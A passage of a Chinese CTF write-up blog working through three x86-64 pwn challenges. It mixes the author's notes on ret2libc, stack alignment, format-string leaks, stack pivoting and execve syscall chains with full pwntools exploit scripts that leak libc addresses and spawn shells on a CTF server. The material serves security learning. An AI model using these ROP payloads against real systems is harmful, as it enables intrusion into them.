<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>有点意思<br>在<code>buy my shop</code>函数处有栈溢出<br>可以控制函数执行流程进行ret2libc</p><p><img src="/2024/10/29/hello-world/p/file-20250303221326376.png"><br>没有开启pie<br>需要考虑栈对齐<br>因为没有开启pie，所以可以利用ret gadgets栈对齐<br><img src="/2024/10/29/hello-world/p/file-20250304132008548.png"><img src="/2024/10/29/hello-world/p/file-20250304132413453.png"></p><p>做这题我刚开始蠢了，<br>64位通过寄存器传递参数，<br>我一开始tm的还用栈传递了参数<br>结果是<br><img src="/2024/10/29/hello-world/p/file-20250304134032978.png"><br>参数传递顺序<br>rdi rsi rdx rcx r8 r9<br>寻找gadgets:<br><img src="/2024/10/29/hello-world/p/file-20250304135630238.png"><br>使用LibcSearcher的话本地可以打通<br><img src="/2024/10/29/hello-world/p/file-20250304153121303.png"><br>本地可以打通<br><img src="/2024/10/29/hello-world/p/file-20250304153233367.png"><br>但是远程无法打通，可能是不能找到正确的libc版本<br>（ps: libcsearcher最多只有10个吗？）</p><p>然而用题目所给的libc可以打通远程，却无法打通本地<br>是因为本地默认用的是系统的libc，而非远程libc<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>exe = ELF(<span class="hljs-string">&#x27;./attachment&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>    <span class="hljs-keyword">elif</span> args.DEBUG:<br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28203</span>)<br>        <br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preprocess</span>():<br>    io.sendlineafter(<span class="hljs-string">&quot;check youer money\n&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;How much do you exchange?&quot;</span>, <span class="hljs-string">&quot;100&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;check youer money\n&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">0x40</span> + <span class="hljs-number">8</span><br>    puts_plt = exe.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>    puts_got = exe.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>    main = exe.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br>    ret_addr = <span class="hljs-number">0x0000000000400579</span><br>    pop_rdi_ret = <span class="hljs-number">0x0000000000400d73</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got: &quot;</span> + <span class="hljs-built_in">hex</span>(puts_got))<br><br>    payload1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br><br>    <br>    preprocess()<br><br>    io.sendlineafter(<span class="hljs-string">&quot;You can name it!!!\n&quot;</span>, payload1)<br>    <span class="hljs-built_in">input</span> = io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<br>    log.info(<span class="hljs-built_in">input</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br>    puts_real_addr = u64(<span class="hljs-built_in">input</span>[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_real_addr: &quot;</span> )<br>    log.info(<span class="hljs-built_in">hex</span>(puts_real_addr))<br><br>    <span class="hljs-comment"># libc = LibcSearcher(&#x27;puts&#x27;, puts_real_addr)</span><br>    libc_base = puts_real_addr - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>    sys = libc_base + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>    bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>    <span class="hljs-comment"># libc_base = puts_real_addr - libc.dump(&quot;puts&quot;)</span><br>    <span class="hljs-comment"># sys = libc_base + libc.dump(&quot;system&quot;)</span><br>    <span class="hljs-comment"># bin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br>    <br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    log.info(<span class="hljs-string">&#x27;libc_base: &#x27;</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(libc_base))<br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    log.info(<span class="hljs-string">&quot;sys: &quot;</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(sys))<br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    log.info(<span class="hljs-string">&quot;bin_sh: &quot;</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(bin_sh))<br>    log.info(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    payload2 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys)<br><br>    preprocess()<br>    io.sendafter(<span class="hljs-string">&quot;You can name it!!!\n&quot;</span>, payload2) <br><br><br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br>    <br><br></code></pre></td></tr></table></figure><hr><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p><img src="/2024/10/29/hello-world/p/file-20250304203217854.png"><br>没有pie、canary<br>查ubuntu版本<br><img src="/2024/10/29/hello-world/p/file-20250304205824378.png"><br>先完成patchelf</p><p>发现用ropper找不到想要的gadgets<br><img src="/2024/10/29/hello-world/p/file-20250304211914149.png"></p><hr><blockquote><p>学习：<br>  flat([])函数<br>  strip()函数<br>  <a href="https://blog.csdn.net/smalosnail/article/details/53243758">一步一步学ROP之linux_x64篇_找不到 pop rdi-CSDN博客</a><br>  上面大佬文章写的很好</p></blockquote><hr><p><img src="/2024/10/29/hello-world/p/file-20250304223042800.png"><br>在libc中可以找到gadgets</p><p>然而 gadgets &#x3D;&gt; libc基地址 &#x3D;&gt; libc中的gadgets所以也没用<br>需要学习一些高级且细腻的操作</p><blockquote><p>参考：<br><a href="https://blog.csdn.net/weixin_44681716/article/details/89057022#:~:text=%E9%92%88%E5%AF%B9%E4%B8%80%E4%BA%9B%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E5%87%BD%E6%95%B0%EF%BC%88%E5%A6%82%E5%8A%A0%E8%BD%BDlibc.so%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E5%87%BD%E6%95%B0%EF%BC%89%EF%BC%8C%E6%8F%90%E5%8F%96%E4%B8%80%E4%BA%9B%E9%80%9A%E7%94%A8%E7%9A%84gadgets%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%9B%B4%E5%88%A9%E4%BA%8E%E6%88%91%E4%BB%AC%E7%BB%A7%E7%BB%ADROP%E6%93%8D%E4%BD%9C%E3%80%82">PWN入门之通用gadgets_gadgets pwn-CSDN博客</a></p></blockquote><hr><p>记录一下python版本<br><img src="/2024/10/29/hello-world/p/file-20250305113738168.png"><br>我的wsl中pip3和pip都指向python3.10这一个python版本<br><img src="/2024/10/29/hello-world/p/file-20250305113836755.png"><br>但可能安装了多个版本（如上4个<br><img src="/2024/10/29/hello-world/p/file-20250305114024121.png"><br>默认只能使用<code>python3</code>， 即 指向的是<code>python3.10</code>这个pip&#x2F;pip3所对应的版本</p><hr><p>我的pwntools解析不了<code>DEBUG</code>命令行参数问题：<br><img src="/2024/10/29/hello-world/p/file-20250305122455175.png"><br>TMD!直接换成别的参数名，如<code>GDB</code>就行了，我真是有点蠢了！（但是实测要大写！）<br>还以为是环境变量、vscode相关设置啥的，还折腾了半天环境变量、<code>set</code>，早知道先试下了<br>pwntools还是很强大的😭</p><hr><p>期间的折腾：<br><img src="/2024/10/29/hello-world/p/file-20250305122911008.png"><br><img src="/2024/10/29/hello-world/p/file-20250305123022327.png"><br><img src="/2024/10/29/hello-world/p/file-20250305123510340.png"></p><p>期间学到一招<br>设置环境变量要在命令前面<br><img src="/2024/10/29/hello-world/p/file-20250305123841997.png"><br><img src="/2024/10/29/hello-world/p/file-20250305123820518.png"><br>在命令后面无效<br><img src="/2024/10/29/hello-world/p/file-20250305123906944.png"></p><hr><p>leave指令：<br>mov rsp rbp<br>&#x3D;&#x3D;pop rbp&#x3D;&#x3D;<br>实际上<br>rbp &#x3D; [rbp]<br>rsp &#x3D; rbp + 8</p><hr><p>做完下一题后又回来看一眼<br><img src="/2024/10/29/hello-world/p/file-20250306131055661.png"><br>还真是得从汇编中寻找gadgets呀<br>ret还是再传统的返回地址处<br><img src="/2024/10/29/hello-world/p/file-20250306131455494.png"></p><hr><p>&#x3D;&#x3D;注意！：<br>rsp里面存的是栈地址，并不是真正的栈内容！&#x3D;&#x3D;</p><hr><p>从上面看，<br>我们可以控制rax为栈顶地址<br>&#x3D;&gt; rdi为栈顶地址 &#x3D;&gt; 栈顶地址对应我们想要的字符串地址<br>搞了半天，发现我们无法直接修改rdi为想要的字符串地址<br>最多只能修改rdi为&#x3D;&#x3D;想要的字符串的地址的地址&#x3D;&#x3D;</p><p>这个方向貌似不太行</p><hr><p>我靠，哭了，<br>看了半天，以为字符串都是rodata<br>才发现是格式化字符串漏洞，程序逻辑还没看清就去找gadgets去了<br><img src="/2024/10/29/hello-world/p/file-20250306152643795.png"></p><p><img src="/2024/10/29/hello-world/p/file-20250306163522534.png"><br>覆盖栈内存后leave操作会破坏栈底<br>但是栈顶仍正常工作，分析后发现重点其实是rax<br><img src="/2024/10/29/hello-world/p/file-20250306163657629.png"><br>可结合这两块gadgets来使用<br>从</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rdi,rax<br>mov eax,0<br>call _printf<br></code></pre></td></tr></table></figure><p>开始使用<br>避免了栈底被破坏的问题</p><p>从打印format切换成了打印buf</p><p>实验1<br>0x7fffa5385960<br><img src="/2024/10/29/hello-world/p/file-20250306180353150.png"><br>0x7fffa53859a0<br><img src="/2024/10/29/hello-world/p/file-20250306180449965.png"><br>0x7fffa5385998<br><img src="/2024/10/29/hello-world/p/file-20250306180526187.png"></p><p>有个问题是leave操作后栈顶地址太高了<br>格式化字符串在它的更低地址处<br>无法打印格式化字符串</p><p>看一眼溢出和栈<br><img src="/2024/10/29/hello-world/p/file-20250307082439719.png"><br>发现是够的<br>printf()识别到<code>\x00</code>会停止输出<br><img src="/2024/10/29/hello-world/p/file-20250307090745548.png"><br>成功一半</p><p>call &#x3D; push ip+1 ; jmp</p><p>一般来说代码段可读可执行<br>data段和bss段可读可写不可执行<br>如果可执行，可直接写入shellcode并当作代码段执行，（又有地址<br>如果不可执行，可以考虑&#x3D;&#x3D;栈迁移&#x3D;&#x3D;<br>有数据段的地址，把数据段当作栈，把指令地址写到栈上</p><p>本地有一次失败：<br><img src="/2024/10/29/hello-world/p/file-20250307115238328.png"><br>远程打通<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>exe = ELF(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>        <span class="hljs-keyword">if</span> args.GDB:<br>            gdb.attach(io)<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path], <span class="hljs-string">&quot;b *main&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># node2.anna.nssctf.cn:28348</span><br>        io = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28348</span>)<br><br><br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    offset = <span class="hljs-number">0x30</span> + <span class="hljs-number">8</span><br>    offset1 = <span class="hljs-number">0x20</span><br>    offset2 = <span class="hljs-number">2</span> + <span class="hljs-number">8</span><br>    puts_plt = exe.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>    puts_got = exe.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>    main = exe.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br>    <span class="hljs-comment"># mov_rdi_rax = 0x00000000004011F0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got: &quot;</span> , <span class="hljs-built_in">hex</span>(puts_got))<br>    call_puts = <span class="hljs-number">0x40124A</span><br>    call_printf = <span class="hljs-number">0x401227</span><br>    addr_ret = <span class="hljs-number">0x40101a</span><br>    addr_bss_rbp = <span class="hljs-number">0x404090</span><br>    <span class="hljs-comment"># payload = b&quot;AAAA%p%p&quot; + b&quot;%p&quot; * 0x17 + b&#x27;BB&#x27; + p64(call_printf)</span><br>    <br>    payload = <span class="hljs-string">b&#x27;%6$s%p%p&#x27;</span> + <span class="hljs-string">b&#x27;%p%p&#x27;</span> + <span class="hljs-string">b&#x27;%pAA&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span> + p64(addr_bss_rbp) + p64(call_printf) + p64(puts_got)<br>    io.recvuntil(<span class="hljs-string">&quot;show your magic\n&quot;</span>)<br>    io.sendline(payload)<br>    <span class="hljs-built_in">input</span> = io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<br>    log.info(<span class="hljs-built_in">input</span>)<br>    puts_real_addr = u64(<span class="hljs-built_in">input</span>[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <br>    log.info(puts_real_addr)<br>    log.info(<span class="hljs-built_in">hex</span>(puts_real_addr))<br><br>    one_gadget = <span class="hljs-number">0xebc81</span><br>    libc_base = puts_real_addr - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>    one_real_gadget = libc_base + one_gadget<br>    log.info(<span class="hljs-built_in">hex</span>(libc_base))<br>    log.info(<span class="hljs-built_in">hex</span>(one_real_gadget))<br><br>    <span class="hljs-comment"># 栈迁移 -0x30</span><br>    offset = <span class="hljs-number">0x30</span><br>    addr_null = <span class="hljs-number">0x404090</span>+<span class="hljs-number">0x40</span><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * offset + p64(addr_null) +p64(one_real_gadget)<br><br>    io.sendlineafter(<span class="hljs-string">&quot;show your magic\n&quot;</span>, payload)<br><br>    <span class="hljs-comment"># 重新进入main</span><br>    <span class="hljs-comment"># 建立新栈帧</span><br>    <span class="hljs-comment"># payload = b&#x27;A&#x27; * offset + p64(one_real_gadget)</span><br>    <span class="hljs-comment"># io.sendlineafter(&quot;show your magic\n&quot;, payload)</span><br><br>    <span class="hljs-comment"># system_addr = libc_base + libc.symbols[&quot;system&quot;]</span><br>    <span class="hljs-comment"># bin_sh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))</span><br>    <span class="hljs-comment"># io.sendlineafter(&quot;show your magic\n&quot;, payload)</span><br>    <span class="hljs-comment"># input = io.recvuntil(&quot;4242&quot;)</span><br>    <span class="hljs-comment"># print(input)</span><br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><hr><h1 id="真会布置栈吗？"><a href="#真会布置栈吗？" class="headerlink" title="真会布置栈吗？"></a>真会布置栈吗？</h1><p><img src="/2024/10/29/hello-world/p/file-20250305163849471.png"><br>64位小端<br>无canary<br>无pie<br>无NX</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sys_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure><p>内核函数，将数据从缓冲区写入到文件描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sys_read</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure><p>系统调用，将数据从文件描述符读入缓冲区</p><p>发现了一个伟大的gadgets<br><img src="/2024/10/29/hello-world/p/file-20250305171359152.png"><br>可以控制寄存器rdi、rsi、&#x3D;&#x3D;r13&#x3D;&#x3D;的值和程序的执行流程<br>可以将rdx清零控制程序的执行流程</p><p>syscall指令用于&#x3D;&#x3D;触发系统调用&#x3D;&#x3D;<br>syscall指令及其参数<br><img src="/2024/10/29/hello-world/p/file-20250305172317900.png"><br>在x86_64架构中，<br><code>syscall</code>指令相关的寄存器：</p><ul><li><code>rax</code> 系统调用号</li><li><code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、 <code>r9</code>：参数传递</li><li><code>rcx</code>：返回地址</li><li><code>r11</code>：标志寄存器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">xor rax,rax    ; 设置rax为0，sys_read<br>xor rdi,rdi    ; 设置rdi为0， fd 文件描述符<br>mov rsi,rsp    ; buf<br>mov edx,539<br>syscall        ; 可见这里是调用了sys_read<br></code></pre></td></tr></table></figure><p><code>execve</code>系统调用号为59<br>想要 syscall &#x3D;&gt; execve(‘&#x2F;bin&#x2F;sh’)<br>则syscall需要：</p><ul><li>rax：设置为59，表示execve</li><li>rdi：设置为&#x2F;bin&#x2F;sh的地址</li><li>rsi：参数列表的地址，可以设置为0</li><li>rdx：一般设置为0，表示环境变量为<code>NULL</code></li></ul><p>根据上面的gadgets，<br>我们可以控制rsi、rdi的值<br>且有syscall指令的地址</p><p>接下来的重点是控制rax的值<br><img src="/2024/10/29/hello-world/p/file-20250305175924282.png"><br>交换&#x3D;&#x3D;r13&#x3D;&#x3D;和rax的值，并跳转到rsp存的地址继续执行</p><p>这样就同时控制了rax,rdi,rsi,（rdx先不管（）</p><p>函数结束后跳到栈顶中地址，而非一般返回地址<br><img src="/2024/10/29/hello-world/p/file-20250305182007167.png"></p><p>这题还有一个点：<br>没有调用libc库函数！<br>无法泄漏libc</p><p>那就要改写一下内存中的数据了<br>这题没有main函数，都在_start函数里面</p><p>还有重量级信息：<br><img src="/2024/10/29/hello-world/p/file-20250305203751916.png"><br>该程序是静态链接<br>静态链接的程序，无法使用ret2libc来做！</p><p>测试1<br><img src="/2024/10/29/hello-world/p/file-20250305204510062.png"><br>测试2<br><img src="/2024/10/29/hello-world/p/file-20250305204615479.png"><br>每次栈的地址都是不同的</p><blockquote><p>[!faq] 栈的地址是如何分配的？<br>受什么影响？</p></blockquote><p>在gdb中栈地址是固定的</p><hr><p>需要修改data段<br>sys_read:<br>rax:0<br>rdi:0<br>rsi: addr_data<br>rdx: &gt;&#x3D;8</p><hr><p>本题有一个需要辨析的关键区别：<br>jmp [rsp]和ret的区别 ！！<br>jmp [rsp]仅仅是指令跳转 对栈没有操作<br>而ret有<br>ret操作必须是栈顶，是跳到栈顶处的地址，不断ret，栈顶元素会不断出栈，是动态的<br>而jmp则不是，jmp是静态的</p><p>ret &#x3D;&#x3D; jmp [rsp] + pop  &#x3D;&#x3D; pop rip<br>jmp [rsp] &#x3D;&#x3D; rip &#x3D; [rsp]</p><hr><p><img src="/2024/10/29/hello-world/p/file-20250305212710287.png"><br>即将jmp到ret<br>栈顶是ret<br>刚jmp到ret：<br><img src="/2024/10/29/hello-world/p/file-20250305212754630.png"><br>栈顶仍是ret</p><p>ret1次：<br>。。。</p><p>上面没管rdx，实际上rdx保留(0x539)<br>，足够大满足要求<br><img src="/2024/10/29/hello-world/p/file-20250305213541817.png"><br>成功拿到系统调用<br>并成功在<code>.data</code>段写入<br><img src="/2024/10/29/hello-world/p/file-20250305213716266.png"></p><hr><p><img src="/2024/10/29/hello-world/p/file-20250305220627758.png"><br>没有拿到shell<br>原因是envp未清零<br>需要清零<br>&#x3D;&gt; 需要将rdx清零<br><img src="/2024/10/29/hello-world/p/file-20250305220913857.png"><br><img src="/2024/10/29/hello-world/p/file-20250305220924277.png"><br><img src="/2024/10/29/hello-world/p/file-20250305220945311.png"><br><img src="/2024/10/29/hello-world/p/file-20250305221010974.png"></p><hr><p>清零后：<br><img src="/2024/10/29/hello-world/p/file-20250305221739587.png"><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&#x27;ZELLIJ&#x27;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span 